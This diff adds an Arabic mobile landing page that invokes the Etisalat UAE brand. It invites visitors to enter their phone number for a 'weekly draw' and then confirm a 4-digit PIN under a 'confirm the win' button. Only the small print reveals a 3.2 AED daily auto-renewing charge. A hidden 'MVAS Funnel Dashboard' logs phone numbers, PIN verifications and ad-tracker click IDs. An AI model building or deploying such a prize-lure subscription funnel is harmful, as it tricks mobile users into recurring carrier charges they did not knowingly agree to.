@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>العرض الخاص من اتصالات</title>
+  <style>
+    /* ── 基础重置与中东本地化布局 ── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { 
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+      background: #f4f7f5; 
+      color: #222; 
+    }
+    
+    /* ── 落地页核心容器 ── */
+    .landing-box { 
+      width: 100%;
+      max-width: 440px; 
+      margin: 0 auto;
+      background: #ffffff;
+      min-height: 100vh; 
+      display: flex; 
+      flex-direction: column; 
+      align-items: center; 
+      padding: 40px 24px; 
+      box-shadow: 0 4px 25px rgba(0,0,0,0.06);
+    }
+
+    /* ── 强力阿拉伯语主标题 ── */
+    .main-title-ar {
+      font-size: 26px;
+      font-weight: 800;
+      text-align: center;
+      color: #007a3d;
+      line-height: 1.4;
+      margin-top: 20px;
+      margin-bottom: 10px;
+    }
+    
+    /* ── 阿拉伯语专属行（由 Exclusive for UAE Etisalat user 转换） ── */
+    .sub-title-ar { 
+      font-size: 15px; 
+      color: #444; 
+      text-align: center; 
+      margin-bottom: 35px; 
+      font-weight: 600;
+      background: rgba(0, 122, 61, 0.06);
+      padding: 6px 16px;
+      border-radius: 20px;
+      display: inline-block;
+    }
+
+    /* ── 引导语 ── */
+    .guide-text {
+      font-size: 14px;
+      color: #555;
+      text-align: center;
+      margin-bottom: 24px;
+      line-height: 1.6;
+    }
+    
+    /* ── 表单输入卡片 ── */
+    .form-card { 
+      width: 100%; 
+      padding: 24px; 
+      border-radius: 20px; 
+      background: #fcfdfe; 
+      border: 1px solid #e2e9e5; 
+    }
+    
+    .form-lbl { 
+      display: block; 
+      font-size: 13px; 
+      font-weight: 700; 
+      margin-bottom: 12px; 
+      color: #333;
+      text-align: right;
+    }
+    
+    /* ── 精密组合式输入框（带国旗与国家代码的同一个格子） ── */
+    .phone-input-group {
+      display: flex;
+      direction: ltr; /* 保持组合框由左到右拼装：[输入框] [国旗] [+971] */
+      border: 2px solid #ccd5d0;
+      border-radius: 12px;
+      overflow: hidden;
+      background: #ffffff;
+      transition: border-color 0.2s;
+      margin-bottom: 20px;
+    }
+    .phone-input-group:focus-within {
+      border-color: #007a3d;
+    }
+
+    /* 用户数字输入部分 */
+    .form-input { 
+      flex: 1;
+      padding: 15px 16px; 
+      border: none;
+      font-size: 18px; 
+      font-weight: 700; 
+      outline: none; 
+      background: transparent;
+      text-align: left; /* 电话号码靠左对齐，符合国际拨号习惯 */
+    } 
+
+    /* 右侧一体化：国旗和+971合并在同一个格子 */
+    .phone-prefix-box {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #f7faf8;
+      padding: 0 14px;
+      border-left: 1px solid #e1e8e4;
+      user-select: none;
+    }
+
+    /* 阿联酋红绿白黑国旗（用纯 CSS 优雅实现，保证加载零延迟） */
+    .uae-flag {
+      width: 24px;
+      height: 14px;
+      display: flex;
+      position: relative;
+      border: 1px solid #eaeaea;
+      box-sizing: border-box;
+    }
+    .flag-red { width: 25%; height: 100%; background: #FF0000; position: absolute; left: 0; top: 0; z-index: 2; }
+    .flag-stripes { width: 75%; height: 100%; position: absolute; right: 0; top: 0; display: flex; flex-direction: column; }
+    .flag-green { flex: 1; background: #00732F; }
+    .flag-white { flex: 1; background: #FFFFFF; }
+    .flag-black { flex: 1; background: #000000; }
+
+    .prefix-text {
+      font-size: 16px;
+      font-weight: 700;
+      color: #111111;
+    }
+    
+    /* 验证码框包围盒 */
+    .pin-input-group {
+      border: 2px solid #ccd5d0;
+      border-radius: 12px;
+      overflow: hidden;
+      background: #ffffff;
+      margin-bottom: 20px;
+    }
+    .pin-input-group input {
+      width: 100%;
+      padding: 15px 16px;
+      border: none;
+      outline: none;
+      font-size: 18px;
+      font-weight: 700;
+      text-align: center;
+      letter-spacing: 4px;
+    }
+
+    /* 按钮样式 */
+    .action-btn { 
+      width: 100%; 
+      background: #007a3d; 
+      color: white; 
+      border: none; 
+      padding: 16px; 
+      font-size: 18px; 
+      font-weight: 700; 
+      border-radius: 12px; 
+      cursor: pointer; 
+      transition: background 0.2s; 
+      box-shadow: 0 4px 12px rgba(0,122,61,0.15); 
+    }
+    .action-btn:hover { 
+      background: #005c2e; 
+    }
+    
+    /* ── 全阿拉伯语资费免责声明（Cost 完美转阿语） ── */
+    .legal-text { 
+      font-size: 11px; 
+      color: #8c9c94; 
+      margin-top: auto; 
+      text-align: center; 
+      line-height: 1.7; 
+      padding-top: 40px;
+    }
+
+    /* ── 工业风监控看板 UI（保持英文不受前端影响） ── */
+    #dashboard-view { 
+      display: none; 
+      background: #0d1117; 
+      color: #e6edf3; 
+      font-family: monospace; 
+      font-size: 13px; 
+      position: fixed; 
+      top:0; left:0; 
+      width:100vw; height:100vh; 
+      overflow-y:auto; 
+      z-index:99999; 
+      direction: ltr; 
+    }
+    .header { display: flex; align-items: center; justify-content: space-between; padding: 10px 20px; background: #161b22; border-bottom: 1px solid #30363d; }
+    .header-stats { display: flex; gap: 28px; }
+    .stat { text-align: center; }
+    .stat-val { font-size: 22px; font-weight: 700; }
+    .stat-lbl { font-size: 9px; color: #8b949e; margin-top: 3px; }
+    .stat:nth-child(1) .stat-val { color: #58a6ff; }
+    .stat:nth-child(2) .stat-val { color: #bc8cff; }
+    .stat:nth-child(3) .stat-val { color: #3fb950; }
+    .stat:nth-child(4) .stat-val { color: #79c0ff; }
+    .stat:nth-child(5) .stat-val { color: #3fb950; }
+    .tabs { display: flex; padding: 0 20px; border-bottom: 1px solid #30363d; background: #0d1117; }
+    .tab-btn { padding: 10px 16px; cursor: pointer; color: #8b949e; font-size: 13px; background: none; border: none; border-bottom: 2px solid transparent; }
+    .tab-btn.active { color: #e3b341; border-bottom-color: #e3b341; }
+    .table-wrap { padding: 20px; }
+    table { width: 100%; border-collapse: collapse; font-size: 12px; }
+    thead th { padding: 8px 10px; text-align: left; color: #8b949e; background: #161b22; border-bottom: 1px solid #30363d; }
+    tbody tr { border-bottom: 1px solid #161b22; }
+    tbody td { padding: 9px 10px; color: #e6edf3; }
+  </style>
+</head>
+<body>
+
+  <div id="landing-view" class="landing-box">
+    
+    <h1 class="main-title-ar">حصرياً لمشتركي اتصالات الإمارات فقط</h1>
+    
+    <div class="sub-title-ar">خاص بمستخدمي اتصالات الإمارات فقط</div>
+    
+    <p class="guide-text">أدخل رقم هاتفك المتحرك الآن للانضمام إلى حملة السحب الأسبوعية المميزة.</p>
+    
+    <div class="form-card" id="step-1">
+      <label class="form-lbl">أدخل رقم هاتفك المتحرك:</label>
+      <div class="phone-input-group">
+        <input type="tel" id="inp-msisdn" class="form-input" placeholder="5XXXXXXXX">
+        <div class="phone-prefix-box">
+          <div class="uae-flag">
+            <div class="flag-red"></div>
+            <div class="flag-stripes">
+              <div class="flag-green"></div>
+              <div class="flag-white"></div>
+              <div class="flag-black"></div>
+            </div>
+          </div>
+          <span class="prefix-text">+971</span>
+        </div>
+      </div>
+      <button class="action-btn">متابعة</button>
+    </div>
+
+    <div class="form-card" id="step-2" style="display: none;">
+      <label class="form-lbl">أدخل رمز PIN المكون من 4 أرقام:</label>
+      <div class="pin-input-group">
+        <input type="number" id="inp-pin" placeholder="XXXX">
+      </div>
+      <button class="action-btn" style="background: #e3b341; box-shadow: 0 4px 12px rgba(227,179,65,0.15);">تأكيد الفوز</button>
+    </div>
+
+    <p class="legal-text">التكلفة: 3.2 درهم إماراتي في اليوم (شاملاً ضريبة القيمة المضافة). يتجدد الاشتراك تلقائيًا. لإلغاء الاشتراك في أي وقت، أرسل STOP إلى 1111.</p>
+  </div>
+
+  <div id="dashboard-view">
+    <header class="header">
+      <div style="font-size:16px; font-weight:700;">📱 MVAS Funnel Dashboard</div>
+      <div class="header-stats">
+        <div class="stat"><div class="stat-val" id="s-pin-requests">0</div><div class="stat-lbl">PIN REQUESTS</div></div>
+        <div class="stat"><div class="stat-val" id="s-unique-msisdn">0</div><div class="stat-lbl">UNIQUE MSISDN</div></div>
+        <div class="stat"><div class="stat-val" id="s-otp-sent">0</div><div class="stat-lbl">OTP SENT</div></div>
+        <div class="stat"><div class="stat-val" id="s-pin-attempts">0</div><div class="stat-lbl">PIN ATTEMPTS</div></div>
+        <div class="stat"><div class="stat-val" id="s-pin-verified">0</div><div class="stat-lbl">PIN VERIFIED</div></div>
+      </div>
+    </header>
+    <div class="tabs">
+      <button id="btn-tab-req" class="tab-btn active" onclick="switchTab('request')">📱 pin_request</button>
+      <button id="btn-tab-vrf" class="tab-btn" onclick="switchTab('verify')">🔑 pin_verify</button>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>DATE</th><th>TELCO</th><th>MSISDN</th><th>VOLUUM CLICK_ID</th><th>TXID (CP REF)</th><th>STATUS</th><th>CP RESPONSE</th>
+          </tr>
+        </thead>
+        <tbody id="tbody-logs"></tbody>
+      </table>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script src="lander.js"></script>
+</body>
+</html>
